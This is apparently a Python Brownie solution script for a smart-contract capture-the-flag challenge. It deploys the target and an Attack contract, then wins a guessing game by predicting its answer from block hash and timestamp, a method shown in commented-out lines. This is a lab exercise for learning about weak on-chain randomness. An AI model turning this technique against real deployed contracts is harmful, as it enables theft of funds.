#!/usr/bin/python3
from time import time

from brownie import Attack, web3
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    # # Get the value of ans
    # block_number = web3.eth.blockNumber
    # block_hash = web3.eth.getBlock(block_number - 1)["hash"].hex()
    # timestamp = web3.eth.getBlock("latest")["timestamp"]

    # # print(block_hash + timestamp)

    # # Compute the answer using the same algorithm as the contract
    # ans_hash = web3.solidityKeccak(["bytes32", "uint32"], [block_hash, timestamp]).hex()
    # print(ans_hash)

    # answer = int("0x" + ans_hash[-2:], 0)
    # print(answer)
    # print(target.answer())

    attcking_contract = Attack.deploy(target.address, {"from": attacker})

    attcking_contract.hack({"from": attacker, "value": "1 ether"})

    # target.guess(answer, {"from": attacker, "value": "1 ether"}).wait(1)

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
